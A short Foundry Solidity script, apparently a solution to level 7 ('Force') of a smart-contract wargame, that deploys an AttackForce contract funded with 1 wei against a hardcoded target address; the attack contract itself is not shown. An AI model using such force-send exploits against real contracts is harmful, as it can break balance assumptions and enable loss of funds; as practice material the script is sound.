// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {AttackForce} from "../src/level7/AttackForce.sol";

contract level7Exploit is Script {
    function run() external {
        vm.startBroadcast();

        new AttackForce{value: 1 wei}(
            0xcb8C459769FE403d69Fec0eF3FBcB92290BC8B1e
        );

        vm.stopBroadcast();
    }
}
